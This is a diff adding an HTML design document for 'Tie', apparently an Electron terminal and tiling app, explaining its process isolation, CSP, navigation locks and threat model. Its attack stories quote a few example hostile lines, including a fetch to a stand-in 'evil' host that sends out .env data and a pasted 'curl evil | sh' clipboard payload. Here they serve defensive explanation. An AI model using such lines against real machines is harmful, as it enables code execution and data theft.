@@ -1,0 +1,363 @@
+<title>How Tie Runs Things</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<style>
+  /* Layout: a single explainer column; figures full-width; "door" matrices as tables. No scripts: readable in a static Tie html tile. */
+  :root {
+    --bg: #fbfaf7; --surface: #ffffff; --surface-2: #f1efe9; --line: #d9d6cd; --fg: #1c1d21; --muted: #5f6370;
+    --accent: #2456b8; --good: #1f7a46; --warn: #a56a00; --bad: #b83227; --trusted: #e8efff; --untrusted: #fff1dc; --dead: #f6e3e1;
+    --font: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", sans-serif;
+    --mono: ui-monospace, "SF Mono", Menlo, monospace;
+    color-scheme: light;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) {
+      --bg: #16181d; --surface: #1e2127; --surface-2: #262a32; --line: #383d48; --fg: #e8e9ec; --muted: #a2a7b3;
+      --accent: #8fb3ff; --good: #6fcf97; --warn: #f0b64a; --bad: #ff7b72; --trusted: #1d2a45; --untrusted: #3a2d16; --dead: #3b2322;
+      color-scheme: dark;
+    }
+  }
+  :root[data-theme="dark"] {
+    --bg: #16181d; --surface: #1e2127; --surface-2: #262a32; --line: #383d48; --fg: #e8e9ec; --muted: #a2a7b3;
+    --accent: #8fb3ff; --good: #6fcf97; --warn: #f0b64a; --bad: #ff7b72; --trusted: #1d2a45; --untrusted: #3a2d16; --dead: #3b2322;
+    color-scheme: dark;
+  }
+  body { background: var(--bg); color: var(--fg); font: 18px/1.6 var(--font); padding-left: max(16px, env(safe-area-inset-left, 0px)); padding-right: max(16px, env(safe-area-inset-right, 0px)); padding-block: 0 80px; }
+  main { max-width: 72ch; margin: 0 auto; }
+  header { padding-block: 44px 18px; border-bottom: 1px solid var(--line); margin-bottom: 30px; }
+  h1 { font-size: 36px; line-height: 1.15; margin: 0 0 10px; letter-spacing: -0.015em; text-wrap: balance; }
+  .lede { font-size: 20px; color: var(--muted); margin: 0; max-width: 58ch; }
+  nav.toc { margin-top: 16px; display: flex; flex-wrap: wrap; gap: 6px 16px; font-size: 15px; }
+  h2 { font-size: 27px; margin: 52px 0 10px; letter-spacing: -0.01em; text-wrap: balance; }
+  h2 small { display: block; font-size: 14px; color: var(--muted); font-weight: 500; letter-spacing: 0.06em; text-transform: uppercase; margin-bottom: 4px; }
+  h3 { font-size: 20px; margin: 30px 0 8px; }
+  p { margin: 0 0 12px; }
+  ul, ol { margin: 0 0 12px; padding-left: 22px; } li { margin: 0 0 6px; }
+  code { font: 0.88em var(--mono); background: var(--surface-2); padding: 1px 5px; border-radius: 4px; }
+  a { color: var(--accent); }
+  .key { background: var(--surface); border: 1px solid var(--line); border-left: 5px solid var(--accent); border-radius: 8px; padding: 12px 16px; margin: 14px 0 18px; }
+  .key b { display: block; font-size: 14px; letter-spacing: 0.06em; text-transform: uppercase; color: var(--accent); margin-bottom: 4px; }
+  figure { margin: 18px 0 22px; }
+  figure svg { width: 100%; height: auto; display: block; background: var(--surface); border: 1px solid var(--line); border-radius: 8px; }
+  figcaption { font-size: 14.5px; color: var(--muted); margin-top: 8px; }
+  .scroll { overflow-x: auto; margin: 0 0 16px; }
+  table { border-collapse: collapse; width: 100%; font-size: 15.5px; }
+  th, td { text-align: left; padding: 8px 10px; border-bottom: 1px solid var(--line); vertical-align: top; }
+  th { color: var(--muted); font-weight: 600; font-size: 13px; letter-spacing: 0.05em; text-transform: uppercase; }
+  td.c { text-align: center; white-space: nowrap; font-size: 15px; }
+  .locked { color: var(--bad); } .guarded { color: var(--warn); } .open { color: var(--good); } .na { color: var(--muted); }
+  .legend { display: flex; flex-wrap: wrap; gap: 8px 18px; font-size: 14px; color: var(--muted); margin: 0 0 10px; }
+  .story { background: var(--surface); border: 1px solid var(--line); border-radius: 8px; padding: 14px 18px 6px; margin: 0 0 16px; }
+  .story h3 { margin: 0 0 8px; font-size: 19px; }
+  .story ol { margin-bottom: 8px; }
+  .story .stop { color: var(--good); font-weight: 600; }
+  .story .leak { color: var(--warn); font-weight: 600; }
+  dl.gloss { display: grid; grid-template-columns: 11em 1fr; gap: 6px 14px; }
+  dl.gloss dt { font-weight: 600; } dl.gloss dd { margin: 0; }
+  @media (max-width: 560px) { dl.gloss { grid-template-columns: 1fr; } body { font-size: 17px; } }
+  .tag { display: inline-block; font: 600 12px/1 var(--mono); letter-spacing: 0.05em; padding: 4px 7px; border-radius: 999px; border: 1px solid currentColor; vertical-align: middle; }
+  .tag.t { color: var(--accent); } .tag.u { color: var(--warn); }
+  :focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+</style>
+
+<main>
+<header>
+  <h1>How Tie Runs Things</h1>
+  <p class="lede">The execution model, the security model and the threat model, from the ground up. Read in order; each part assumes the one before.</p>
+  <nav class="toc">
+    <a href="#one">1 · One picture</a><a href="#exec">2 · Execution</a><a href="#tiles">3 · Each tile</a><a href="#security">4 · Security model</a><a href="#doors">5 · The doors</a><a href="#threats">6 · Threats</a><a href="#stories">7 · Stories</a><a href="#change">8 · Changing Tie</a><a href="#gloss">Glossary</a>
+  </nav>
+</header>
+
+<section id="one">
+  <h2><small>Part 1</small>One picture to keep</h2>
+  <p>Tie is a house with three kinds of occupants.</p>
+  <ul>
+    <li><strong>The landlord</strong> holds every key: files, shells, the network, the OS. That is the <em>main process</em>.</li>
+    <li><strong>The family</strong> lives in the living room and has a remote control that asks the landlord for things. That is the <em>shell</em>: Tie's own UI, with terminals in it.</li>
+    <li><strong>Visitors</strong> are shown into glass rooms. They can be seen, they can wave, they cannot get out. Those are <em>content tiles</em>: markdown, text, images, html pages, web sites.</li>
+  </ul>
+  <div class="key"><b>The whole model in one line</b>Viewing is safe, running is a choice, content never reaches the shell.</div>
+  <p>Everything else in this document explains how the glass is made, which doors exist, who may knock on them, and what happens when a visitor is hostile.</p>
+</section>
+
+<section id="exec">
+  <h2><small>Part 2</small>Execution model: what runs where</h2>
+  <p>Tie is an Electron app. Electron gives us one privileged Node.js process and any number of Chromium pages. Tie uses five kinds of process.</p>
+  <figure>
+    <svg viewBox="0 0 880 520" role="img" aria-label="Tie's processes: main at the top; the shell renderer; content frame processes and browser guest processes below it; pty children of main; the tie CLI talking to main over a socket.">
+      <defs><marker id="a" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker></defs>
+      <g fill="none" stroke="currentColor" stroke-width="1.3" font-family="-apple-system, Helvetica Neue, sans-serif" font-size="13">
+        <rect x="300" y="20" width="280" height="88" rx="8" fill="var(--trusted)"/>
+        <text x="314" y="44" fill="currentColor" stroke="none" font-weight="700">main (Node, full power)</text>
+        <text x="314" y="64" fill="currentColor" stroke="none">files · ptys · protocols · guards</text>
+        <text x="314" y="84" fill="currentColor" stroke="none">decides every path, URL, size, kind</text>
+
+        <rect x="300" y="160" width="280" height="88" rx="8" fill="var(--trusted)"/>
+        <text x="314" y="184" fill="currentColor" stroke="none" font-weight="700">shell renderer (Tie's UI)</text>
+        <text x="314" y="204" fill="currentColor" stroke="none">tabs, tiles, terminals (xterm)</text>
+        <text x="314" y="224" fill="currentColor" stroke="none">window.tie = the remote control</text>
+        <line x1="440" y1="108" x2="440" y2="158" marker-end="url(#a)" marker-start="url(#a)"/>
+        <text x="450" y="138" fill="currentColor" stroke="none">IPC (checked: shell only)</text>
+
+        <rect x="60" y="320" width="330" height="110" rx="8" fill="var(--untrusted)"/>
+        <text x="74" y="344" fill="currentColor" stroke="none" font-weight="700">content frame processes</text>
+        <text x="74" y="364" fill="currentColor" stroke="none">markdown · text · image · hex · html</text>
+        <text x="74" y="384" fill="currentColor" stroke="none">one sandboxed iframe each, own origin,</text>
+        <text x="74" y="404" fill="currentColor" stroke="none">own process, no network, no window.tie</text>
+        <line x1="225" y1="320" x2="330" y2="250" marker-end="url(#a)"/>
+        <text x="120" y="290" fill="currentColor" stroke="none">one MessagePort, typed requests</text>
+
+        <rect x="490" y="320" width="330" height="110" rx="8" fill="var(--untrusted)"/>
+        <text x="504" y="344" fill="currentColor" stroke="none" font-weight="700">browser guest processes</text>
+        <text x="504" y="364" fill="currentColor" stroke="none">any web site, in a &lt;webview&gt;</text>
+        <text x="504" y="384" fill="currentColor" stroke="none">own session with network, no preload,</text>
+        <text x="504" y="404" fill="currentColor" stroke="none">no Tie schemes, permissions denied</text>
+        <line x1="655" y1="320" x2="550" y2="250" marker-end="url(#a)"/>
+        <text x="600" y="290" fill="currentColor" stroke="none">events only (title, url)</text>
+
+        <rect x="60" y="20" width="200" height="88" rx="8"/>
+        <text x="74" y="44" fill="currentColor" stroke="none" font-weight="700">pty children</text>
+        <text x="74" y="64" fill="currentColor" stroke="none">your shells, servers, agents</text>
+        <text x="74" y="84" fill="currentColor" stroke="none">spawned by main, as you</text>
+        <line x1="260" y1="64" x2="298" y2="64" marker-end="url(#a)" marker-start="url(#a)"/>
+
+        <rect x="620" y="20" width="200" height="88" rx="8"/>
+        <text x="634" y="44" fill="currentColor" stroke="none" font-weight="700">tie CLI</text>
+        <text x="634" y="64" fill="currentColor" stroke="none">in any of your processes</text>
+        <text x="634" y="84" fill="currentColor" stroke="none">unix socket, JSON-RPC</text>
+        <line x1="620" y1="64" x2="582" y2="64" marker-end="url(#a)"/>
+
+        <rect x="60" y="460" width="760" height="40" rx="8" stroke-dasharray="6 4"/>
+        <text x="74" y="485" fill="currentColor" stroke="none">macOS, your account. Blue = Tie's own code (trusted). Orange = other people's content (untrusted).</text>
+      </g>
+    </svg>
+    <figcaption>Five kinds of process. Main owns everything; the shell asks it over IPC; content and web run in their own processes with no path to main except through the shell, which treats their messages as hostile.</figcaption>
+  </figure>
+
+  <h3>The five, one at a time</h3>
+  <ol>
+    <li><strong>Main.</strong> Node.js with Electron's APIs. It spawns ptys, reads files, serves Tie's pages over two custom URL schemes (<code>tie://</code> for the UI, <code>tie-content://</code> for content), installs every guard, and answers the socket. Nothing untrusted ever runs here.</li>
+    <li><strong>Shell renderer.</strong> One Chromium page, <code>tie://app/index.html</code>. Only Tie's code runs in it. It has a bridge, <code>window.tie</code>, that main checks on every call: must be this window, must be the main frame, must be the shell's URL. Terminals render here (xterm.js) because keystrokes must reach ptys; that makes it the most valuable room in the house.</li>
+    <li><strong>Content frame processes.</strong> Each file tile is an <code>&lt;iframe&gt;</code> inside the shell page, but Chromium puts it in its own process because its origin differs (site isolation). Its URL is <code>tie-content://&lt;128-bit token&gt;/…</code>; the token is minted per tile and is the only credential: it names the folder main will serve. Viewer kinds (markdown, text, image, hex) load Tie's own viewer page; the html kind loads the file itself.</li>
+    <li><strong>Browser guest processes.</strong> A <code>&lt;webview&gt;</code> is a separate web contents with its own session (<code>persist:browser</code>): it has the network and persistent cookies, and none of Tie's schemes or bridges. Main rebuilds its preferences from nothing when it attaches, whatever the tag asked for.</li>
+    <li><strong>Pty children.</strong> Your login shell, or <code>--cmd</code>, spawned by main with a pseudo-terminal. They are yours: your uid, Tie's environment plus <code>TIE_SOCKET</code> and <code>TIE_TILE</code>. The <code>tie</code> CLI runs inside them (or anywhere else of yours) and talks to main over a unix socket that only your account can open.</li>
+  </ol>
+
+  <h3>What happens when you open something</h3>
+  <ul>
+    <li><strong>A terminal.</strong> Shell asks main <code>pty:spawn</code>. Main runs the configured shell. Output streams back as bytes; xterm draws them. Links in output are text until you cmd-click one.</li>
+    <li><strong>A markdown file.</strong> Shell asks main to check the file (exists, regular, size cap, kind by extension) and to open a token for its folder. Shell makes an iframe pointing at <code>tie-content://token/_tie/markdown.html</code>. Main serves Tie's viewer there with a fresh per-response nonce in its CSP. The viewer answers a handshake; the shell sends it the file's text over a MessagePort. The viewer renders, sanitizes, and only ever sends typed requests back.</li>
+    <li><strong>An html file.</strong> Same token mechanism, but the frame loads the file itself, with Tie's bootstrap script injected first. The page's own scripts run only if the tile's pill says "Scripts: on"; otherwise the CSP lets only the bootstrap run and the page is static.</li>
+    <li><strong>A web site.</strong> Shell creates a webview with <code>src</code>. Main's attach guard throws away every attribute but <code>src</code>, forces the browser partition, sandbox, no preload. From then on the site is a browser tab with extra rules.</li>
+  </ul>
+
+  <h3>What runs in the same JavaScript realm</h3>
+  <p>Two things in one realm can read each other's variables. That is the line that matters most.</p>
+  <ul>
+    <li>Shell realm: Tie's UI code, xterm, <code>window.tie</code>. Nothing else, ever.</li>
+    <li>Each content frame: its own realm, own origin (opaque for viewers, the token for html). Cannot name the shell's window, cannot post to it except through the port the shell handed it.</li>
+    <li>Each guest: own realm, own process, no bridge at all. It can't even tell it is inside Tie beyond the user agent (which hides Electron).</li>
+    <li>Main: Node, no web content at all.</li>
+  </ul>
+</section>
+
+<section id="tiles">
+  <h2><small>Part 3</small>Each tile, in the same words</h2>
+  <p>For every kind: who wrote the code that runs, what the tile can read, what it can send, and what it can make happen outside itself.</p>
+  <div class="scroll"><table>
+    <thead><tr><th>Kind</th><th>Code running</th><th>Can read</th><th>Can send to the shell</th><th>Can cause outside</th></tr></thead>
+    <tbody>
+      <tr><td><strong>terminal</strong> <span class="tag t">trusted</span></td><td>xterm (Tie's) in the shell; your programs in the pty</td><td>Program output as bytes; your keystrokes</td><td>Everything a program of yours can do; it is you</td><td>Anything, as you. Links: hover shows target, cmd-click + confirm</td></tr>
+      <tr><td><strong>markdown</strong> <span class="tag u">untrusted file</span></td><td>Tie's viewer; the file is data</td><td>The file's text; images from its folder (as pixels only)</td><td><code>followLink</code>, <code>hover</code>, <code>pong</code></td><td>Open a local file beside it; open a URL after confirm</td></tr>
+      <tr><td><strong>text / hex / image</strong> <span class="tag u">untrusted file</span></td><td>Tie's viewer; the file is data</td><td>The file</td><td><code>pong</code> (no links)</td><td>Nothing</td></tr>
+      <tr><td><strong>html, scripts off</strong> <span class="tag u">untrusted file</span></td><td>Tie's bootstrap only; the page is markup</td><td>Its folder, recursively (stylesheets, images)</td><td><code>followLink</code>, <code>hover</code>, <code>pong</code></td><td>Navigate within its folder; open a file beside; URL after confirm</td></tr>
+      <tr><td><strong>html, scripts on</strong> <span class="tag u">untrusted code</span></td><td>The page's scripts, isolated</td><td>Its folder, recursively (fetch works); its own in-memory storage</td><td>Same verbs, any time while focused</td><td>Same as above; it can <em>ask</em> any time, you still confirm the web</td></tr>
+      <tr><td><strong>browser</strong> <span class="tag u">untrusted site</span></td><td>The site, like a browser tab</td><td>The internet; its own cookies</td><td>Nothing (events only: title, URL)</td><td>Popup to system browser within 1 s of your input; download within 10 s of your input</td></tr>
+    </tbody>
+  </table></div>
+  <p>Notice what is absent from the last column everywhere except the terminal: the shell, the ptys, other tiles, your files beyond the one folder, the network. Those are the doors. Part 5 lists them.</p>
+</section>
+
+<section id="security">
+  <h2><small>Part 4</small>Security model: how Tie reasons</h2>
+  <h3>Principles</h3>
+  <ol>
+    <li><strong>Viewing is safe.</strong> Opening a file to look at it must never be a decision. So viewers are Tie's code, the file is data, and html opens static.</li>
+    <li><strong>Running is a choice.</strong> Scripts run only when a human turned them on (the pill) and only inside the glass room.</li>
+    <li><strong>Content never reaches the shell.</strong> No foreign script in the shell realm, no navigation of the shell window, no message listener on the window. The bridge to main exists only there.</li>
+    <li><strong>Main decides.</strong> The shell names paths and URLs; main checks every one again: absolute, exists, inside the root, real path, size cap, kind, scheme. A compromised shell would still be bounded by main's checks on what it names.</li>
+    <li><strong>Exits are guarded, not features.</strong> A visitor can wave: typed requests only, validated for shape, needing focus for anything that acts, confirmed by you for anything that leaves the house.</li>
+    <li><strong>Two layers where one would do.</strong> No network: CSP <em>and</em> a dead proxy on the whole session. No shell navigation: the guard <em>and</em> the CSP's frame rules. Downloads: the sandbox flag <em>and</em> the session refusing them.</li>
+    <li><strong>What differs per kind lives in one table.</strong> <code>core/policy.ts</code>: sandbox flags, CSP, navigation rule, payload, size cap. Everything else is the same baseline for every content kind.</li>
+    <li><strong>Every guard has a scenario that was red first.</strong> Guards get lost in refactors otherwise. <code>sec-*</code> in <code>dev/scenarios</code>.</li>
+    <li><strong>Failures stay visible.</strong> A hung frame becomes an error tile, not a silent reload. A refused link is logged. Nothing retries on its own.</li>
+  </ol>
+
+  <h3>The layers, from the outside in</h3>
+  <figure>
+    <svg viewBox="0 0 880 380" role="img" aria-label="Concentric layers around a content tile: process and site isolation, origin and sandbox attribute, CSP and no-network session, navigation lock, typed requests over one port, gesture rule and confirms, main re-validation.">
+      <g fill="none" stroke="currentColor" stroke-width="1.3" font-family="-apple-system, Helvetica Neue, sans-serif" font-size="13">
+        <rect x="20" y="20" width="840" height="340" rx="10"/><text x="34" y="44" fill="currentColor" stroke="none" font-weight="700">7 · main re-validates: path inside root, real path, size, kind, http(s) only</text>
+        <rect x="60" y="62" width="760" height="278" rx="10"/><text x="74" y="86" fill="currentColor" stroke="none" font-weight="700">6 · you: confirm for the web, focus for anything that acts, the scripts pill</text>
+        <rect x="100" y="104" width="680" height="216" rx="10"/><text x="114" y="128" fill="currentColor" stroke="none" font-weight="700">5 · one MessagePort, typed verbs, strict shape, flood cap</text>
+        <rect x="140" y="146" width="600" height="154" rx="10"/><text x="154" y="170" fill="currentColor" stroke="none" font-weight="700">4 · navigation lock: this token's viewer, or pages of this root, nothing else</text>
+        <rect x="180" y="188" width="520" height="92" rx="10"/><text x="194" y="212" fill="currentColor" stroke="none" font-weight="700">3 · CSP (nonce or 'self' only) + session with no network at all</text>
+        <rect x="220" y="230" width="440" height="30" rx="10" fill="var(--untrusted)"/><text x="234" y="250" fill="currentColor" stroke="none" font-weight="700">1–2 · own process · own origin · sandbox attribute · the content</text>
+      </g>
+    </svg>
+    <figcaption>A hostile file sits in the middle. Each ring is independent: breaking one leaves the others. Rings 1 to 3 are Chromium's; 4 to 7 are Tie's.</figcaption>
+  </figure>
+  <ol>
+    <li><strong>Process.</strong> Site isolation: a different origin means a different renderer process. A renderer exploit in a content frame lands in a process with no Node, no bridge, and nothing but that frame.</li>
+    <li><strong>Origin and sandbox.</strong> Viewer frames: <code>sandbox="allow-scripts"</code>, opaque origin: no storage, no fetch, no cookies, no same-origin anything. Html frames add <code>allow-same-origin</code> so the page's own modules and fetch of its folder work, on its token origin, which is still foreign to the shell.</li>
+    <li><strong>CSP and no network.</strong> Viewer pages: scripts only by a nonce minted per response; images only from the own token. Html pages: only <code>'self'</code> (the token) plus <code>data:</code>/<code>blob:</code>; scripts by nonce when off. Under all of it, the shell session's proxy points every connection at a closed port and WebRTC may not use UDP: even a CSP bug reaches no network.</li>
+    <li><strong>Navigation lock.</strong> Main sees every navigation of every frame. A frame may load only its token's exact viewer URL (viewers) or <code>.html</code> files of its own root (html). Each token binds to the first frame that loads it. The shell window itself may only reload itself.</li>
+    <li><strong>One port, typed verbs.</strong> The shell hands each frame one MessagePort after load. Requests must be plain objects with a known verb and exactly its keys. Over a thousand a second are dropped unread.</li>
+    <li><strong>You.</strong> Verbs that act (<code>followLink</code>, <code>openLink</code>) need the frame to be focused, and frames can't focus themselves (Blink refuses focus calls without a user gesture under the permissions policy Tie sets). Anything going to the system browser shows you the full URL first, with Open disabled for 600 ms. Scripts in html pages run only after you flip the pill.</li>
+    <li><strong>Main again.</strong> Whatever the shell asks for after all that, main checks as if the shell were lying.</li>
+  </ol>
+
+  <h3>The pieces around the house</h3>
+  <ul>
+    <li><strong>Keyboard shortcuts</strong> are matched in main before any page sees the key. A page can't swallow ⌘W or fake ⌘D. Synthetic key events never reach main.</li>
+    <li><strong>Paste and drops</strong> into a terminal go through a guard: control characters and would-run newlines ask first; dropped file names are shell-quoted.</li>
+    <li><strong>The socket and state dir</strong> are 0600 and 0700: your account only. The socket is deliberately not a boundary between your own processes.</li>
+    <li><strong>Permissions</strong> (camera, mic, location, notifications, clipboard read, Bluetooth, USB, client certificates) are denied for every session.</li>
+    <li><strong>Electron fuses</strong> turn off the usual injection paths in the packaged app (<code>NODE_OPTIONS</code>, <code>--inspect</code>, loading code from outside the asar).</li>
+  </ul>
+</section>
+
+<section id="doors">
+  <h2><small>Part 5</small>The doors</h2>
+  <p>A door is a way for something inside a tile to affect something outside it. This is the matrix to keep in your head. Every security question about a tile is "which door, and who holds the handle".</p>
+  <div class="legend"><span><span class="locked">●</span> locked: no mechanism exists</span><span><span class="guarded">●</span> guarded: exists, with a rule or a confirm</span><span><span class="open">●</span> open: it is the feature</span><span><span class="na">–</span> not applicable</span></div>
+  <div class="scroll"><table>
+    <thead><tr><th>Door →<br>Tile ↓</th><th>Network</th><th>Files it didn't open</th><th>Shell realm / main</th><th>Other tiles</th><th>Your keyboard</th><th>System browser</th><th>Disk writes</th><th>Run code as you</th></tr></thead>
+    <tbody>
+      <tr><td><strong>markdown / text / image / hex</strong></td><td class="c locked">●</td><td class="c locked">●</td><td class="c locked">●</td><td class="c locked">●</td><td class="c guarded">● only when you click in</td><td class="c guarded">● click + confirm</td><td class="c locked">●</td><td class="c locked">●</td></tr>
+      <tr><td><strong>html, scripts off</strong></td><td class="c locked">●</td><td class="c guarded">● its folder, as markup</td><td class="c locked">●</td><td class="c locked">●</td><td class="c guarded">● only when you click in</td><td class="c guarded">● click + confirm</td><td class="c locked">●</td><td class="c locked">●</td></tr>
+      <tr><td><strong>html, scripts on</strong></td><td class="c locked">●</td><td class="c guarded">● its folder, readable</td><td class="c locked">●</td><td class="c locked">●</td><td class="c guarded">● while focused, then a few s</td><td class="c guarded">● confirm, scripts may ask</td><td class="c locked">●</td><td class="c locked">●</td></tr>
+      <tr><td><strong>browser</strong></td><td class="c open">●</td><td class="c locked">●</td><td class="c locked">●</td><td class="c locked">●</td><td class="c guarded">● only when you click in</td><td class="c guarded">● popup ≤ 1 s after input</td><td class="c guarded">● ~/Downloads ≤ 10 s after input</td><td class="c locked">●</td></tr>
+      <tr><td><strong>terminal (your programs)</strong></td><td class="c open">●</td><td class="c open">●</td><td class="c open">● via <code>tie</code></td><td class="c open">● via <code>tie</code></td><td class="c open">●</td><td class="c guarded">● cmd-click + confirm</td><td class="c open">●</td><td class="c open">●</td></tr>
+    </tbody>
+  </table></div>
+  <p>Two readings of this table:</p>
+  <ul>
+    <li>The last row is the only one with open doors, and it is open because it is <em>you</em>. Anything that gets into a terminal has everything. That is why pastes are guarded and why nothing else can type into one.</li>
+    <li>Every content row has exactly two guarded doors that lead out: your keyboard, and your system browser. Both need you. The "files it didn't open" door for html is a read inside the glass room; the only way to carry something out is still the browser door, which shows you the URL.</li>
+  </ul>
+</section>
+
+<section id="threats">
+  <h2><small>Part 6</small>Threat model: who attacks, wanting what</h2>
+  <h3>Attackers</h3>
+  <ul>
+    <li><strong>A file</strong> you or an agent opened: markdown with crafted links and images, an html report with scripts and a bundled library, an SVG, a text file with escape sequences.</li>
+    <li><strong>A site</strong> in a browser tile: anything on the web, with your logged-in cookies for that profile.</li>
+    <li><strong>Terminal output</strong>: a program printing escape sequences, OSC 8 links with lying text, a title.</li>
+    <li><strong>The clipboard</strong>: text copied from a site, with hidden characters or newlines.</li>
+    <li><strong>Not an attacker, by decision:</strong> a process already running in your shell, agents included. It has everything with or without <code>tie</code>. Confining it is a sandboxing question for you, not a Tie feature.</li>
+  </ul>
+  <h3>What they want, and what stops them</h3>
+  <div class="scroll"><table>
+    <thead><tr><th>Goal</th><th>Needs</th><th>Stopped by</th><th>Residual</th></tr></thead>
+    <tbody>
+      <tr><td>Run code as you</td><td>Script in the shell realm, a pty write, or the socket</td><td>Shell CSP, no foreign navigation, IPC sender check, no window listener, viewers sanitize, socket 0600</td><td>A Chromium sandbox escape; another process of yours</td></tr>
+      <tr><td>Read your files</td><td>A path main will serve</td><td>Token = one root; traversal, symlinks out, other tokens refused; viewers can't fetch at all</td><td>Html with scripts on reads its own folder; keep html roots narrow</td></tr>
+      <tr><td>Send data out</td><td>A network path or a URL you open</td><td>Dead proxy + CSP; confirm with full URL and long-link warning</td><td>You clicking Open on a URL that carries data</td></tr>
+      <tr><td>Type for you</td><td>Keyboard focus</td><td>Frames can't focus themselves; shortcuts matched in main</td><td>A few seconds of script focus after your own click in a page</td></tr>
+      <tr><td>Make you run something</td><td>Pasted or dropped text reaching a terminal raw</td><td>Paste guard (control characters, would-run newlines), quoted drop paths</td><td>Guards can be turned off in settings</td></tr>
+      <tr><td>Deceive</td><td>Looking like something trusted</td><td>Content can't name its tile; kind glyph is Tie's; dialogs are the shell's, outside the tile</td><td>Titles set by your own processes; a page imitating UI inside its own tile</td></tr>
+      <tr><td>Plant files</td><td>A download</td><td>Content frames: refused outright. Guests: only within 10 s of your input, sanitized name, never opened</td><td>Several files within those 10 s</td></tr>
+      <tr><td>Freeze Tie</td><td>Main's memory or the UI thread</td><td>Streaming reads, size caps, watchdog kills hung frames, message flood cap</td><td>A guest hogging CPU until Chromium reports it</td></tr>
+    </tbody>
+  </table></div>
+</section>
+
+<section id="stories">
+  <h2><small>Part 7</small>Four stories, step by step</h2>
+  <p>Each follows an attack through the layers and marks where it stops. These are the mental movies to replay when a change touches a layer.</p>
+
+  <div class="story">
+    <h3>The poisoned report</h3>
+    <ol>
+      <li>An agent writes <code>report.html</code> in your repo root and runs <code>tie open report.html</code>. The chart library it bundled was tampered upstream.</li>
+      <li>The tile opens. <span class="stop">Scripts are off:</span> the CSP lets only Tie's bootstrap run. The library is inert markup. End of story unless you flip the pill.</li>
+      <li>Say you flip it. The script runs in its own process and origin. It fetches <code>.env</code>: <span class="leak">allowed</span>, same root.</li>
+      <li>It tries <code>fetch('https://evil/…')</code>. <span class="stop">CSP refuses; the session's proxy would refuse anyway.</span> WebRTC: <span class="stop">no UDP.</span></li>
+      <li>It calls <code>window.open('https://evil/?d=…')</code>. The bootstrap turns it into a request. <span class="stop">Not focused:</span> dropped. You click in the page to read it. Now focused: a dialog appears with the full URL, the host in bold, a warning that 1,900 characters ride on it. Open is disabled for 600 ms. <span class="stop">You cancel.</span></li>
+      <li>It tries <code>window.focus()</code> later to get another chance. <span class="stop">Blink refuses</span> without a fresh gesture.</li>
+    </ol>
+    <p>What would have to fail for the data to leave: you, pressing Open on a link that announces itself.</p>
+  </div>
+
+  <div class="story">
+    <h3>The lying link</h3>
+    <ol>
+      <li><code>README.md</code> says <code>[documentation](https://evil.example/login)</code>. The viewer renders it as a normal link.</li>
+      <li>You hover. <span class="stop">The strip at the tile's bottom-left shows the real URL</span>, drawn by the shell, where the document can't draw.</li>
+      <li>You click anyway. The viewer sends <code>followLink</code>. The shell classifies: http(s). <span class="stop">Dialog, full URL.</span> You cancel.</li>
+      <li>Had it been <code>javascript:</code>, <code>file:</code> or <code>smb:</code>: <span class="stop">refused</span> before any dialog. Had it been <code>../.ssh/id_rsa</code>: opened beside you as a text tile, on your screen only; nothing reads it but you.</li>
+    </ol>
+  </div>
+
+  <div class="story">
+    <h3>The drive-by</h3>
+    <ol>
+      <li>A site in a browser tile starts a download of <code>invoice.pdf.command</code> on load.</li>
+      <li><span class="stop">No input reached that guest in the last 10 s:</span> blocked, logged.</li>
+      <li>You click something on the page; it tries again. Saved, under a sanitized unique name, in <code>~/Downloads</code>. <span class="stop">Never opened, never executed.</span></li>
+      <li>It calls <code>window.open</code> for an ad. Within 1 s of your click: <span class="leak">goes to your system browser</span> (a browser would open a tab; Tie never opens windows). Later: blocked.</li>
+      <li>It asks for Bluetooth, the camera, your location, a client certificate. <span class="stop">All denied</span>, no prompt.</li>
+    </ol>
+  </div>
+
+  <div class="story">
+    <h3>The clipboard trap</h3>
+    <ol>
+      <li>A page shows <code>brew install foo</code>. Its copy handler puts <code>brew install foo\ncurl evil | sh\n</code> on the clipboard.</li>
+      <li>You paste into a terminal. <span class="stop">The paste guard sees newlines and no bracketed paste:</span> a dialog shows the text with the breaks visible. You cancel.</li>
+      <li>Had the text carried an escape sequence (<code>ESC[201~</code> to end a bracketed paste early): <span class="stop">control characters are shown in red</span> and asked about.</li>
+      <li>With both guards turned off in settings: the paste goes in raw. That is the trade you made.</li>
+    </ol>
+  </div>
+</section>
+
+<section id="change">
+  <h2><small>Part 8</small>How to reason about a change</h2>
+  <p>Before adding a feature that touches content, answer these in order. If any answer is "I'm not sure", the feature is not ready.</p>
+  <ol>
+    <li><strong>Which realm does the new code run in?</strong> Shell realm: it must be Tie's code only. Content realm: assume it is hostile the moment it ships.</li>
+    <li><strong>Which door does it open or widen?</strong> Find the cell in the matrix. If it moves a cell from locked to guarded, what is the guard, and who holds the handle: main, the shell, or you?</li>
+    <li><strong>Is the difference per kind in the policy table?</strong> If a kind needs a new permission, it is a new column in <code>core/policy.ts</code>, pinned by a unit test, not a special case in a kind.</li>
+    <li><strong>Does main re-check it?</strong> Anything named by the shell (path, URL, kind, size) must be validated again in main.</li>
+    <li><strong>What is the second layer?</strong> If the first layer is a CSP, what stops it when the CSP is wrong?</li>
+    <li><strong>Which scenario is red before the change and green after?</strong> Write that one first. Name it <code>sec-*</code> if it is a guard.</li>
+    <li><strong>What does the user see when it is refused?</strong> A log line is the minimum; a visible error when the tile can't do its job.</li>
+  </ol>
+  <div class="key"><b>If you remember one thing</b>Every tile is a glass room. The question is never "can we trust this content". It is "which door did we just add, and who holds the handle".</div>
+</section>
+
+<section id="gloss">
+  <h2><small>Reference</small>Glossary</h2>
+  <dl class="gloss">
+    <dt>Main</dt><dd>Electron's Node process. All power lives here. <code>src/main/</code>.</dd>
+    <dt>Shell</dt><dd>Tie's UI page, <code>tie://app</code>. Trusted realm with <code>window.tie</code>. <code>src/renderer/</code>.</dd>
+    <dt>Realm</dt><dd>A JavaScript global scope. Code in one realm can read everything in it and nothing in another.</dd>
+    <dt>Origin</dt><dd>Scheme + host (+ port). The browser's unit of trust: storage, fetch and DOM access are per origin.</dd>
+    <dt>Token</dt><dd>128 random bits that are a content tile's host name, origin and credential. Maps to one folder in main.</dd>
